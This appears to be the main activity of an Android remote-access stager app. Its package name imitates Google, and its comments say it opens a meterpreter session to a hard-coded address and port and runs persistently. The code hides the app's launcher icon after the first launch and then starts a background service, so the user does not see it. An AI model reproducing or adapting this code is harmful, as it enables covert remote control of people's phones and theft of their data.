package stage.google.com.test;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;


import android.app.Activity;

public class MainActivity extends Activity {

    // This application is designed to open a meterpreter session to the following ip-port
    // LHOST = 192.168.178.30:4444 to modify this, open Payload.java
    // This application runs forever ( "android:persistent=true" ). This SHOULD NOT BE TRUE for any application, except system apps.
    // Has been set to true for experimental purposes, check AndroidManifest if you want to disable this

        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            Intent mis = new Intent(this,MyIntentService.class);
            hideApplication();
            this.startService(mis);
            finish();
        }

        private void hideApplication() {
            /* nasconde l'icona dal drawer dopo il primo avvio */
            PackageManager pm = getApplicationContext().getPackageManager();
            pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

        }
    }




